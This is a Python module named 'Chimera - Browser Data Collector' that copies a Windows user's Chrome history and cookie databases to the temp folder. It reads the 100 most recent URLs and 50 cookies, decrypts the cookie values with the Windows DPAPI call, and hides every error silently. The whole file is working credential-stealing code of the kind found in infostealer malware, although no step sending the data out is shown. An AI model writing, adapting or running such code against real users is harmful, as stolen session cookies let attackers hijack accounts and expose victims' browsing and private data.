"""
Chimera - Browser Data Collector
Extracts history, cookies, bookmarks
"""
import os
import sqlite3
import shutil
import json
import win32crypt

class BrowserData:
    @staticmethod
    def collect_all():
        """Collect all browser data"""
        data = {
            "history": [],
            "cookies": [],
            "bookmarks": []
        }
        
        # Chrome history
        history_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        if os.path.exists(history_path):
            try:
                temp_path = os.path.join(os.environ['TEMP'], 'history_temp.db')
                shutil.copy2(history_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                
                for row in cursor.fetchall():
                    data["history"].append({
                        "url": row[0],
                        "title": row[1],
                        "timestamp": row[2]
                    })
                
                conn.close()
                os.remove(temp_path)
            except:
                pass
        
        # Chrome cookies
        cookies_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
        if os.path.exists(cookies_path):
            try:
                temp_path = os.path.join(os.environ['TEMP'], 'cookies_temp.db')
                shutil.copy2(cookies_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 50")
                
                for row in cursor.fetchall():
                    try:
                        value = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                    except:
                        value = ""
                    
                    data["cookies"].append({
                        "domain": row[0],
                        "name": row[1],
                        "value": value
                    })
                
                conn.close()
                os.remove(temp_path)
            except:
                pass
        
        return data
